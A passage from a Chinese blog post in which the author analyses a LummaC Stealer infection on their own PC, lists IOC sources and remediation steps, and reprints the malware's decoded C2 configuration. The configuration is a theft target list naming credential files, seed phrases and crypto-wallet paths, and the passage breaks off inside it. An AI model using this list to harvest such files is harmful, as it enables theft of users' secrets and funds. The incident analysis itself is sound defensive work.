src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/13.png" alt="浏览器敏感信息" loading="lazy"></p><p>浏览器敏感信息</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/14.png" alt="密码，自动填充信息，历史记录，网页数据，Cookie" loading="lazy"></p><p>密码，自动填充信息，历史记录，网页数据，Cookie</p><p><img src="/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/15.png" alt="浏览器日志" loading="lazy"></p><p>浏览器日志</p><p>推论：该木马植入后门后，进行规模化的自动化利用，且主要用于获取直接经济利益。</p><p>比较遗憾的一点是当时没及时查看c2conf具体的配置，不清楚具体的目标。也没想去any.run上跑一下看看。</p><p>其实该配置文件开头是<strong>32-byte的XOR密钥，CyberChef就能秒掉</strong></p><p>搜索该C2服务器，在一个安全研究组织的网站上找到了唯一的结果：</p><p><a href="https://ioc.finsin.cl/Output_FINSIN_URL">https://ioc.finsin.cl/Output_FINSIN_URL</a></p><p>搜索<code>/c2conf</code> <code>/api</code>可以看到并非孤例，注册者均类似，怀疑出自同一主体。</p><p>但是，本次样本是<code>/api</code> ，<del>不清楚为何</del>(更换了新的Endpoint)。</p><p><a href="https://twitter.com/g0njxa/status/1702444978503360989">https://twitter.com/g0njxa/status/1702444978503360989</a></p><p>考虑到这是MaaS且攻击者表现出了很低的专业性（未清空已删除邮件），有理由怀疑使用的是木马发布者的预设。</p><h2 id="措施"><a href="#措施" class="headerlink" title="措施"></a>措施</h2><p>重置密码管理器中的<strong>所有</strong>密码（有效的约30个）</p><p>网络账号登出其他设备</p><p>废弃所有私钥（3个）</p><p>更改邮箱密码</p><p>Steam两步验证（这次只有它受伤，因为只有Valve特立独行搞个自己的两步验证然后验证码收不到）</p><p>禁用PowerShell执行，破坏PowerShell用于利用的库</p><p>检查注册表与计划任务相关项（尤其是在沙盒中有可疑修改迹象的对象、Entry）</p><p>禁止IoC中的域名、IP等</p><p>清除浏览器缓存与Cookie</p><p>删除<code>%TEMP%</code>目录下的所有.exe</p><p>删除<code>%USERPROFILE%</code> <code>%APPDATA%</code> <code>%LOCALAPPDATA%</code>对应的在沙箱中被读写的文件</p><p>“快去叫360老将来！”</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对网络安全心存敬畏！注意保护好自己的硬件</p><blockquote><p>Punch line: 中国组织用俄罗斯的木马包装了一个钓鱼安装包卖给乌克兰人在冰岛网站上钓鱼并且在靶机上放了个后门与美国服务器联通</p></blockquote><p>这次非常侥幸！电脑娱乐用，不和干活机子混用所以没有敏感信息；其上没有两步验证软件或者虚拟货币钱包；绝大部分的后渗透也被两步验证拦下了。</p><p>至少目前看来，C2服务器被Cloudflare拿下，也确实Down了。沙盒里没有展现其他的C2服务器连接。除非安置了别的后门，否则应该是安全的。</p><p>信息泄露是不可逆的，惨痛教训+1</p><p>几乎一致的样本（连压缩包都是一个名字）：<a href="https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/#">https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/#</a></p><ul><li>不过这个似乎被木马认出来在虚拟环境里，自己crash掉了。</li></ul><p>完全吻合的分析：<a href="https://www.esentire.com/blog/the-case-of-lummac2-v4-0">https://www.esentire.com/blog/the-case-of-lummac2-v4-0</a></p><p>技术分析：<a href="https://www.intrinsec.com/wp-content/uploads/2023/10/TLP-CLEAR-Lumma-Stealer-EN-Information-report.pdf">https://www.intrinsec.com/wp-content/uploads/2023/10/TLP-CLEAR-Lumma-Stealer-EN-Information-report.pdf</a></p><p>已经可以说实锤了。</p><p>顺带一提Any.Run真是好东西，学校邮箱可以注册。</p><ul><li><p>疑似同一攻击者的C2 配置，看得出来完全就是预设</p>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;v&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*key*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*bitcoin*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*binance*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*exodus*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*coinbase*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*wallet*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*seed*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*pass*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*ledger*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*trezor*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*metamask*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*crypto*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Important Files/Profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Binance&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app-store.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Binance&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Binance&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.finger-print.fp&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Binance&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Binance&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;simple-storage.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Binance&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Electrum\\wallets&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Electrum&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Ethereum&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keystore&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span 